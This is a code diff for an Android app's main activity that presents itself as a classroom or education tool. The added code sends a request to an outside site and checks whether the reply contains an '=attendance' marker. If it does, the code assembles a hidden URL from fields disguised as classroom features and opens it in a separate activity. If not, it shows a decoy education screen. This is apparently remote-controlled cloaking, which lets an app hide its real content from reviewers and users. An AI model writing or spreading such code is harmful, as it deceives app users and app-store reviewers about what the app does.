@@ -9,6 +9,7 @@ import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
 import androidx.compose.ui.res.colorResource
 import androidx.core.content.ContextCompat.startActivity
+import androidx.navigation.NavController
 import androidx.navigation.compose.rememberNavController
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -26,10 +27,7 @@ class MainActivity : ComponentActivity() {
         setContent {
             ScreenStatusBar(colorResource(id = R.color.black))
             val navController = rememberNavController()
-            val subNavController = rememberNavController()
-            val parNavController = rememberNavController()
-            NavGraphNavigate(this, navController, subNavController, parNavController)
-            sendPostRequest(this, true)
+            sendPostRequest(this, true, navController)
         }
     }
 }
@@ -65,7 +63,7 @@ fun parseResponseData(responseBody: String): ResponseData {
         professional_development = jsonObject.getString("professional_development")
     )
 }
-fun sendPostRequest(context: Context, isKeitaro: Boolean) {
+fun sendPostRequest(context: Context, isKeitaro: Boolean, navController: NavController) {
     val url = "https://adventur-warld.site/attendance/"
     val client = OkHttpClient()
     val requestBodyData = if (isKeitaro) {
@@ -87,24 +85,29 @@ CoroutineScope(Dispatchers.IO).launch {
             val responseBody = response.body?.string()
             if (responseBody != null) {
                 val responseData = parseResponseData(responseBody)
-                val resultString = with(responseData) {
-                    listOf(lesson_planning,
-                        grade_tracking,
-                        attendance_management,
-                        resource_library,
-                        interactive_whiteboard,
-                        student_feedback,
-                        parent_communication,
-                        classroom_activities,
-                        behavior_monitoring,
-                        professional_development
-                    ).joinToString("") { it.substringAfter("attendance") }
+                if(responseData.toString().contains("=attendance")){
+                    val resultString = with(responseData) {
+                        listOf(lesson_planning,
+                            grade_tracking,
+                            attendance_management,
+                            resource_library,
+                            interactive_whiteboard,
+                            student_feedback,
+                            parent_communication,
+                            classroom_activities,
+                            behavior_monitoring,
+                            professional_development
+                        ).joinToString("") { it.substringAfter("attendance") }
+                    }
+                    Log.d("TAG", "responseData: $responseData")
+                    val intent = Intent(context, OwnActivity::class.java).apply {
+                        putExtra("url", resultString)
+                    }
+                    context.startActivity(intent)
+                } else {
+                   navController.navigate("EducateScreen")
                 }
-                Log.d("TAG", "responseData: $responseData")
-                val intent = Intent(context, OwnActivity::class.java).apply {
-                    putExtra("url", resultString)
-                }
-                context.startActivity(intent)
+
             }
         } else {
             Log.e("TAG", "Request failed with status code: ${response.code}")
